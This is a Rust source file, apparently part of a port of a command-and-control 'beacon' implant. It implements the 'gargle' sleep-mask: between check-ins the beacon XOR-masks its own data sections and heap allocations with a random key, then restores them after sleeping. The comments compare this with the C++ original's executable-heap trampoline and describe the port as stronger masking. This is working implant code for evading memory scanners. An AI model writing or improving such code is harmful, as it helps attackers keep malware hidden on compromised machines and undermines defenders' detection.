//! Port of gargle.cpp — the sleep-mask ("gargle") routine.
//!
//! `GargleSleep` is what the beacon calls between check-ins: when the
//! `SETTING_GARGLE_NOOK` option is set and no worker threads are running, the
//! beacon's data sections and its tracked heap allocations are XOR-masked with
//! a random 13-byte key for the duration of the sleep, then restored.
//!
//! The C++ copies a raw asm trampoline into an executable heap region and
//! executes it while masked (the trampoline region itself is excluded from the
//! mask via the reversed-pair trick in `gargle_trampoline`). The Rust port
//! uses a documented safe equivalent with identical effect: the mask function
//! is ordinary Rust code (never executed from masked memory), the same memory
//! ranges are masked with the same XOR pattern (see
//! `crate::gargleint::mask_sections_and_heap`), and the sleep is a plain
//! `std::thread::sleep` in 100 ms slices (the granularity the C++ used).

use crate::beacon::SETTING_GARGLE_NOOK;
use crate::gargleint::GargleP;
use crate::settings::setting_int;
use crate::state::THREAD_COUNT;
use std::sync::atomic::Ordering;
use std::time::{Duration, Instant};

pub use crate::gargleint::gargle_trampoline;

/// `GARGLEF` — the sleep-mask function signature. In the C++ it is a raw
/// function pointer into the trampoline; in the Rust port the mask routine is
/// a plain `fn(&GargleP, u32)` and `GargleSleep` calls it directly.
type GargleF = fn(&GargleP, u32);

/// `_gargle_it` — the sleep-mask routine.
///
/// Masks the beacon's sections and tracked heap records, sleeps `time`
/// milliseconds (in 100 ms slices, matching the C++ `Sleep(100)` granularity),
/// then unmasks everything. The C++ toggled the mask on/off every slice
/// because the trampoline executed from inside the masked image; the Rust
/// equivalent keeps the data masked for the whole sleep (strictly stronger)
/// and restores it afterwards — XOR twice with the same key returns the
/// original bytes.
fn gargle_it(parms: &GargleP, time: u32) {
    let start = Instant::now();

    /* stomp on our Beacon data */
    crate::gargleint::mask_sections_and_heap(parms);

    loop {
        std::thread::sleep(Duration::from_millis(100));
        if start.elapsed().as_millis() as u64 >= time as u64 {
            break;
        }
    }

    crate::gargleint::unmask_sections_and_heap(parms);
}

/// `setup_trampoline2` — one-time trampoline/parameter setup. Only the
/// addresses of the marker functions are recorded (they are never called
/// through the trampoline in the Rust port).
fn setup_trampoline2() {
    gargle_trampoline(
        (setup_trampoline2 as fn()) as usize as *mut u8,
        (gargle_it as GargleF) as usize as *mut u8,
    );
}

/// `GargleSleep` — masked sleep.
///
/// If gargle is disabled (`SETTING_GARGLE_NOOK == 0`) or worker threads are
/// running (`threadcount > 0`) this is a plain sleep, exactly like the C++.
/// Otherwise the beacon data is masked for the duration of the sleep.
pub fn gargle_sleep(time: u32) {
    if setting_int(SETTING_GARGLE_NOOK) == 0 || THREAD_COUNT.load(Ordering::SeqCst) > 0 {
        std::thread::sleep(Duration::from_millis(time as u64));
        return;
    }

    /* create our trampoline, please */
    setup_trampoline2();

    /* get the heap sections to mask in case new items have been added. */
    crate::gargleint::refresh_heap_records();

    /* stomp on our Beacon data */
    let parms = crate::gargleint::gparms();
    gargle_it(&parms, time);
}
